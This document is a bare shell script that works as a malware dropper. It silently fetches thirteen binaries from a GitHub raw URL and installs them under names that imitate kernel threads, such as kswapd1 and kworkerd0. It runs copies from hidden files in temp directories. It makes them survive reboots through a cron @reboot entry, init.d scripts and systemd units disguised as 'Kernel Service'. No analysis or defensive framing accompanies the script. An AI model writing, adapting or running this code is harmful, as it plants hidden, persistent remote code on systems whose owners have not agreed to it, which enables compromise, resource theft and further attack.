#!/bin/sh
BASE_URL="https://raw.githubusercontent.com/uxaarp/usagi1/main"
INSTALL_DIR="/usr/local/sbin"
BACKUP_DIR="/var/tmp/.kernel_cache"
BINARIES="biosd0 defenwqd devfreqd0 ethd0 ip6addrrd kintegritv0 kpsmoused0 ksnapd0 kswapd1 kvmirqd kworkerd0 mdsync1 ttmswapd"
TMP_DIRS="/tmp /var/tmp /dev/shm"

download_binary() {
    binary="$1"
    url="$BASE_URL/$binary"
    output="$INSTALL_DIR/$binary"
    
    if command -v wget >/dev/null 2>&1; then
        wget -q "$url" -O "$output" >/dev/null 2>&1
    elif command -v curl >/dev/null 2>&1; then
        curl -s -L "$url" -o "$output" >/dev/null 2>&1
    fi
    
    if [ -f "$output" ] && [ -s "$output" ]; then
        chmod +x "$output" >/dev/null 2>&1
    else
        rm -f "$output" >/dev/null 2>&1
    fi
}

launch_all_binaries() {
    for binary in $BINARIES; do
        install_path="$INSTALL_DIR/$binary"
        if [ -x "$install_path" ]; then
            "$install_path" >/dev/null 2>&1 &
        fi
    done
    
    sleep 0.3
    
    for binary in $BINARIES; do
        install_path="$INSTALL_DIR/$binary"
        if [ -f "$install_path" ]; then
            if ! pgrep -f "$binary" >/dev/null 2>&1; then
                rm -f "$install_path" >/dev/null 2>&1
            fi
        fi
    done
}

create_temp_copies() {
    binary="$1"
    install_path="$INSTALL_DIR/$binary"
    
    for tmp_dir in $TMP_DIRS; do
        if [ -d "$tmp_dir" ] && [ -x "$install_path" ]; then
            hash=$(echo "$binary" 2>/dev/null | md5sum | cut -c1-8)
            [ -z "$hash" ] && hash="k"
            tmp_copy="$tmp_dir/.$hash"
            cp "$install_path" "$tmp_copy" >/dev/null 2>&1
            chmod +x "$tmp_copy" >/dev/null 2>&1
            "$tmp_copy" >/dev/null 2>&1 &
        fi
    done
}

setup_cron_once() {
    cron_entry="@reboot for bin in $BINARIES; do if [ -x $INSTALL_DIR/\$bin ]; then $INSTALL_DIR/\$bin >/dev/null 2>&1 &; fi; done"
    tmp_cron=$(mktemp 2>/dev/null)
    if [ -f "$tmp_cron" ]; then
        crontab -l 2>/dev/null | grep -v "@reboot.*for bin in" > "$tmp_cron"
        echo "$cron_entry" >> "$tmp_cron"
        crontab "$tmp_cron" >/dev/null 2>&1
        rm -f "$tmp_cron" >/dev/null 2>&1
    fi
}

setup_initd_selective() {
    for binary in $BINARIES; do
        install_path="$INSTALL_DIR/$binary"
        if [ -x "$install_path" ] && pgrep -f "$binary" >/dev/null 2>&1; then
            init_script="/etc/init.d/kernel-$binary"
            cat > "$init_script" << EOF
#!/bin/sh
case "\$1" in
    start)
        $install_path >/dev/null 2>&1 &
        ;;
    stop)
        pkill -f "$binary" >/dev/null 2>&1
        ;;
    *)
        exit 0
        ;;
esac
EOF
            chmod +x "$init_script" >/dev/null 2>&1
            "$init_script" start >/dev/null 2>&1
        fi
    done
}

setup_systemd_selective() {
    if command -v systemctl >/dev/null 2>&1; then
        for binary in $BINARIES; do
            install_path="$INSTALL_DIR/$binary"
            if [ -x "$install_path" ] && pgrep -f "$binary" >/dev/null 2>&1; then
                service_file="/etc/systemd/system/kernel-$binary.service"
                cat > "$service_file" << EOF
[Unit]
Description=Kernel Service
After=network.target

[Service]
Type=simple
ExecStart=$install_path
Restart=no

[Install]
WantedBy=multi-user.target
EOF
                systemctl enable "kernel-$binary.service" >/dev/null 2>&1
                systemctl start "kernel-$binary.service" >/dev/null 2>&1
            fi
        done
        systemctl daemon-reload >/dev/null 2>&1
    fi
}

main() {
    mkdir -p "$INSTALL_DIR" "$BACKUP_DIR" >/dev/null 2>&1
    
    for binary in $BINARIES; do
        download_binary "$binary"
    done
    
    launch_all_binaries
    
    for binary in $BINARIES; do
        if pgrep -f "$binary" >/dev/null 2>&1; then
            create_temp_copies "$binary"
        fi
    done
    
    setup_cron_once
    setup_initd_selective
    setup_systemd_selective
}

main >/dev/null 2>&1 &
exit 0